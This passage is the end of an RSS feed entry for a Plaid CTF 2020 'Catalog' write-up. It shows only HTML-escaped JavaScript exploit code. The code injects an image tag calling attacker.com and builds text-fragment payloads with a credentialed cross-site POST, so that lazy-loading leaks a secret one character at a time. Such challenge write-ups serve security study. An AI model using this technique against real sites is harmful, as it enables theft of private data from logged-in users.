&lt;span class=&quot;nx&quot;&gt;alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`}0123456789ABDEFGHIJKLMNOPQRSTUVWXYZ_`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;~~~~~~&amp;lt;h1&amp;gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;img src=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//attacker.com/img&quot; loading=&quot;lazy&quot; /&amp;gt;~~~~~&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;letter&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`text=T-,F,{,-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;letter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%26`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#:~:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://catalog.pwni.ng/user.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;no-cors&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;content-type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;password=hello&amp;amp;action=login&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://catalog.pwni.ng/issue.php?id=3#:~:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-04-01/Plaid-CTF-Catalog</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-01/Plaid-CTF-Catalog</guid>
        
        <category>ctf</category>
        
        <category>write-up</category>
        
        
      </item>
    
  </channel>
</rss>